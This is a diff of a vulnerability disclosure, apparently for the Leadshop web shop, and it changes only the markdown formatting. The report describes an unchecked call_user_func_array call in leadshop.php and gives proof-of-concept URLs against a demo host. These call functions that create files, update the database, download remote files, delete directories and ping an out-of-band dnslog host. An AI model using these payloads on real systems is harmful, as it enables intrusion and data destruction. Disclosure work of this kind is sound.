@@ -15,14 +15,14 @@ The vulnerability is in the leadshop/web/leadshop.php[27-61] file
             return call_user_func_array([$this, $include], [$meta, $data]);  
 ……
 ```
-The ```call_user_func_array``` function is used directly, and $include, $data, and $meta receive get parameters, which allows us to run all functions in this file (parameters less than or equal to 2), such as:  
-HttpGet (http access: poc: ```https://demo.leadshop.vip/leadshop.php?include=HttpGet&meta=6nup69.dnslog.cn```),  
-ToMkdir (Create a file with content 1 and file name 1: poc: ```https://demo.leadshop.vip/leadshop.php?include=ToMkdir&meta=1&data=1```),  
-UpdateSql (perform database update: poc: ```https://demo.leadshop.vip/leadshop.php?include=UpdateSql```),  
+The `call_user_func_array` function is used directly, and $include, $data, and $meta receive get parameters, which allows us to run all functions in this file (parameters less than or equal to 2), such as:  
+HttpGet (http access: poc: `https://demo.leadshop.vip/leadshop.php?include=HttpGet&meta=6nup69.dnslog.cn`),  
+ToMkdir (Create a file with content 1 and file name 1: poc: `https://demo.leadshop.vip/leadshop.php?include=ToMkdir&meta=1&data=1`),  
+UpdateSql (perform database update: poc: `https://demo.leadshop.vip/leadshop.php?include=UpdateSql`),  
 DownloadFile (download file: poc: 
-```https://demo.leadshop.vip/leadshop.php?include=DownloadFile&meta=www.baidu.com/img/flexible/logo/pc/peak-result.png```),  
+`https://demo.leadshop.vip/leadshop.php?include=DownloadFile&meta=www.baidu.com/img/flexible/logo/pc/peak-result.png`),  
 RemoveDir (remove directory: poc: 
-```https://demo.leadshop.vip/leadshop.php?include=RemoveDir&meta=[path]```)  
+`https://demo.leadshop.vip/leadshop.php?include=RemoveDir&meta=[path]`)  
 -
 Proof of Concept:
 -
